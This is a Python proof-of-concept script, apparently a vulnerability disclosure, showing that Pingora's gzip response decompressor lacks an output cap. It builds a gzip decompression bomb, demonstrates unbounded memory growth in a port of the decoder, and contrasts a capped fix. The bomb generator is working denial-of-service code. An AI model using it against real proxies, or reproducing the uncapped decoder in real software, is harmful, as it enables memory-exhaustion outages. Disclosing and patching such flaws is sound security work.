#!/usr/bin/env python3
"""
CrabRabbit — Pingora response decompression has no output-size cap (CWE-770/409).

Cloudflare pingora's brand-new (2026) HTTP response-compression module can DECOMPRESS
an upstream response body (gzip / brotli) when the client's Accept-Encoding does not
cover the origin's Content-Encoding. The decompressor accumulates the decompressed bytes
into an unbounded growable buffer:

    // pingora-core/src/protocols/http/compression/gzip.rs  (Decompressor::encode)
    let reserve_size = if input.len() < MAX_INIT_COMPRESSED_SIZE_CAP {
        input.len() * ESTIMATED_COMPRESSION_RATIO      // an *initial capacity hint* only
    } else {
        input.len()
    };
    self.decompress.get_mut().reserve(reserve_size);   // reserve() is just a hint
    self.decompress.write_all(input)                    // Vec<u8> GROWS to full output, NO cap

The `reserve()` is only a capacity hint — `write_all()` grows the backing `Vec<u8>` to
hold the entire decompressed output of that chunk, with no maximum size. The comment in
the source even admits "there is a DoS risk of always allocate 3x the memory of the input
buffer" — but the mitigation only caps the *reserve hint*, never the *actual* output, so a
highly-compressed (bomb) chunk still expands ~1000x into memory.

This file is a faithful Python port of `Decompressor::encode` (gzip path). It demonstrates
that a tiny compressed chunk balloons into a large in-memory buffer with no limit, and
contrasts it with a patched variant that enforces a max decompressed size.
"""
import argparse
import gzip
import io
import sys
import zlib

# Mirror the Rust constants from gzip.rs / brotli.rs
MAX_INIT_COMPRESSED_SIZE_CAP = 4 * 1024
ESTIMATED_COMPRESSION_RATIO = 3  # gzip: 3; brotli: 4


class PingoraGzipDecompressor:
    """Faithful port of pingora's gzip Decompressor::encode().

    Mirrors the Rust exactly:
      * a growable output buffer (the `GzDecoder<Vec<u8>>` inner Vec),
      * a `reserve()` capacity hint (NOT a limit),
      * `write_all(input)` that grows the buffer to the full decompressed size,
      * no cap anywhere.
    """

    def __init__(self):
        self.buf = bytearray()          # stands in for the inner Vec<u8>
        self.decompressor = zlib.decompressobj(16 + zlib.MAX_WBITS)  # gzip wrapper
        self.total_in = 0
        self.total_out = 0
        self.peak_buf = 0

    def encode(self, data: bytes, end: bool):
        # --- exact port of the reserve hint (gzip.rs:49-54) ---
        if len(data) < MAX_INIT_COMPRESSED_SIZE_CAP:
            reserve = len(data) * ESTIMATED_COMPRESSION_RATIO
        else:
            reserve = len(data)
        # bytearray has no reserve(); we just note the intended hint is NOT a limit.
        self._hint = reserve
        # --- exact port of write_all (gzip.rs:56): unbounded growth ---
        out = self.decompressor.decompress(data)
        if end:
            out += self.decompressor.flush()
        self.buf.extend(out)
        self.total_in += len(data)
        self.total_out += len(out)
        self.peak_buf = max(self.peak_buf, len(self.buf))
        taken = bytes(self.buf)          # std::mem::take(self.decompress.get_mut())
        self.buf = bytearray()
        return taken


class PatchedGzipDecompressor(PingoraGzipDecompressor):
    """The fix: enforce a hard cap on decompressed output per chunk."""

    MAX_DECOMPRESSED = 4 * 1024 * 1024  # 4 MiB (chosen so the 800x demo clearly trips it)

    def encode(self, data: bytes, end: bool):
        out = self.decompressor.decompress(data, self.MAX_DECOMPRESSED + 1)
        if len(out) > self.MAX_DECOMPRESSED:
            raise zlib.error("decompressed output exceeds cap (decompression bomb rejected)")
        if end:
            out += self.decompressor.flush()
        if len(out) > self.MAX_DECOMPRESSED:
            raise zlib.error("decompressed output exceeds cap (decompression bomb rejected)")
        self.total_in += len(data)
        self.total_out += len(out)
        self.peak_buf = max(self.peak_buf, len(out))
        return out


def gzip_bomb_ratio_limited(target_ratio=800, max_in=8 * 1024):
    """Build a small, highly-compressible gzip stream (the 'bomb').

    gzip/deflate compresses runs of a repeated byte up to ~1032:1. We generate a small
    compressed payload (a few KB) whose decompressed size is ~target_ratio times larger.
    """
    decompressed_size = max_in * target_ratio
    block = (b"\x00" * 65536)  # 64 KiB of zeros; deflate collapses this to ~60 bytes
    raw = io.BytesIO()
    written = 0
    while written < decompressed_size:
        chunk = block[: decompressed_size - written]
        raw.write(chunk)
        written += len(chunk)
    raw.seek(0)
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(raw.getvalue())
    return buf.getvalue()


def main():
    ap = argparse.ArgumentParser(description="CrabRabbit PoC — pingora decompression bomb")
    ap.add_argument("--ratio", type=int, default=800,
                    help="target decompression ratio (default 800x)")
    ap.add_argument("--chunk", type=int, default=16 * 1024,
                    help="compressed chunk size fed to the decoder (default 16 KiB, "
                         "mirrors pingora's read-buffer chunking)")
    args = ap.parse_args()

    bomb = gzip_bomb_ratio_limited(target_ratio=args.ratio, max_in=args.chunk)
    print(f"[+] gzip bomb: {len(bomb):,} compressed bytes "
          f"(decompresses ~{len(bomb) * args.ratio // 1024:,} KiB)\n")

    # --- vulnerable path (no cap) ---
    vuln = PingoraGzipDecompressor()
    total = 0
    for off in range(0, len(bomb), args.chunk):
        chunk = bomb[off:off + args.chunk]
        out = vuln.encode(chunk, end=(off + args.chunk >= len(bomb)))
        total += len(out)
    print("=== VULNERABLE (pingora gzip Decompressor::encode, HEAD 3f87e92) ===")
    print(f"    decompressed a {len(bomb):,}B input into {total:,}B "
          f"({total // max(len(bomb), 1)}x) with NO output cap")
    print(f"    peak in-memory buffer for a single chunk: {vuln.peak_buf:,}B "
          f"({vuln.peak_buf // 1024:,} KiB)")

    # --- patched path (cap) ---
    patched = PatchedGzipDecompressor()
    try:
        for off in range(0, len(bomb), args.chunk):
            chunk = bomb[off:off + args.chunk]
            patched.encode(chunk, end=(off + args.chunk >= len(bomb)))
        print("\n=== PATCHED (4 MiB output cap) ===")
        print("    (bomb under cap — no alarm; increase --ratio to trip it)")
    except zlib.error as e:
        print("\n=== PATCHED (4 MiB output cap) ===")
        print(f"    REJECTED: {e}")

    print("""
[explanation]
  - pingora's Decompressor::encode() (gzip.rs / brotli.rs) writes decompressed bytes into
    a growable Vec<u8> with no maximum size; reserve() is only a capacity *hint*.
  - A malicious/compromised upstream that answers with Content-Encoding: gzip (when the
    proxy has decompression enabled and the client cannot accept gzip) can make the proxy
    allocate ~ratio * chunk_size bytes per chunk — an amplification the plain streaming
    path does not have.
  - Fix: cap decompressed output per chunk (e.g. DecompressorWriter / GzDecoder wrapped in a
    Take with a max size), mirroring the limit minio's zstd path applies (WithDecoderMaxWindow).
""")


if __name__ == "__main__":
    main()
